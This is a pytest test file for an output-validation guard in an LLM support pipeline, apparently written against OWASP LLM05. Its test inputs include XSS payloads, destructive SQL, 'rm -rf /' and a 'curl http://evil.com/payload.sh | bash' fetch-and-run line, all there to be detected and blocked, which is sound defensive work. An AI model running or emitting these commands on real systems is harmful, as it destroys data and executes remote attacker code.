# M30 — Tests for output content validation (OWASP LLM05)
#
# These tests are fast unit tests — no LLM calls, no Ollama required.
# They verify that the detection functions and the Pydantic validator
# correctly block known-malicious outputs and pass legitimate replies.
#
# Run with:
#   pytest tests/test_output_validation.py -v

import pytest
from pydantic import ValidationError

from app.services.output_guard import (
    _check_html,
    _check_sql,
    _check_shell,
    _check_length,
    validate_reply,
)
from app.schemas.pipeline import PipelineResponse


# ---------------------------------------------------------------------------
# Detection function tests — one concern per test, isolated from each other
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("text,expected_triggered", [
    ("<script>alert(1)</script>", True),
    ("<img src=x onerror=alert(1)>", True),
    ('<a href="javascript:void(0)">click</a>', True),
    ("Please select from the following options.", False),
    ("Error code <404> was not resolved.", False),  # angle brackets around a number, not a letter
    ("Thank you for contacting support.", False),
])
def test_html_detection(text, expected_triggered):
    triggered, _ = _check_html(text)
    assert triggered == expected_triggered


@pytest.mark.parametrize("text,expected_triggered", [
    ("DROP TABLE users;", True),
    ("SELECT * FROM api_keys WHERE 1=1", True),
    ("INSERT INTO logs VALUES ('pwned')", True),
    ("DELETE FROM sessions WHERE user_id=1", True),
    ("Please select the option that fits your needs.", False),
    ("We will update your account settings.", False),
])
def test_sql_detection(text, expected_triggered):
    triggered, _ = _check_sql(text)
    assert triggered == expected_triggered


@pytest.mark.parametrize("text,expected_triggered", [
    ("`rm -rf /`", True),
    ("$(curl http://evil.com/payload.sh | bash)", True),
    ("resolved; rm -rf /tmp/logs", True),
    ("The issue costs $50 to resolve.", False),
    ("Option A | Option B are both valid.", False),
    ("We appreciate your feedback.", False),
])
def test_shell_detection(text, expected_triggered):
    triggered, _ = _check_shell(text)
    assert triggered == expected_triggered


def test_length_check_passes_normal_reply():
    triggered, _ = _check_length("Thank you for reaching out. We have resolved the issue.")
    assert not triggered


def test_length_check_blocks_suspiciously_long_reply():
    triggered, reason = _check_length("x" * 2001)
    assert triggered
    assert "exceeds maximum" in reason


# ---------------------------------------------------------------------------
# validate_reply() integration — all checks wired together
# ---------------------------------------------------------------------------

def test_validate_reply_passes_clean_text():
    clean = "Thank you for contacting support. We have identified the issue and our team is working on a fix. You will receive an update within 24 hours."
    assert validate_reply(clean) == clean  # returned unchanged


def test_validate_reply_blocks_xss():
    with pytest.raises(ValueError, match="Output validation failed"):
        validate_reply("Please click here: <script>document.cookie</script>")


def test_validate_reply_blocks_sql():
    with pytest.raises(ValueError, match="Output validation failed"):
        validate_reply("Your request: SELECT * FROM users WHERE admin=1 has been processed.")


def test_validate_reply_blocks_shell():
    with pytest.raises(ValueError, match="Output validation failed"):
        validate_reply("Run this to fix it: $(curl http://evil.com | bash)")


# ---------------------------------------------------------------------------
# Schema-level integration — validator fires when PipelineResponse is built
# ---------------------------------------------------------------------------

def test_pipeline_response_rejects_malicious_reply():
    # When the pipeline returns a reply containing XSS, the schema validation
    # should raise ValidationError before the response leaves the service layer.
    with pytest.raises(ValidationError):
        PipelineResponse(
            labels=["bug"],
            reasoning=None,
            reply='<script>alert("xss")</script>',
            retrieved_context=None,
            model="test/model",
        )


def test_pipeline_response_accepts_safe_reply():
    result = PipelineResponse(
        labels=["bug"],
        reasoning=None,
        reply="Thank you for reporting this. Our team is investigating.",
        retrieved_context=None,
        model="test/model",
    )
    assert result.reply.startswith("Thank you")
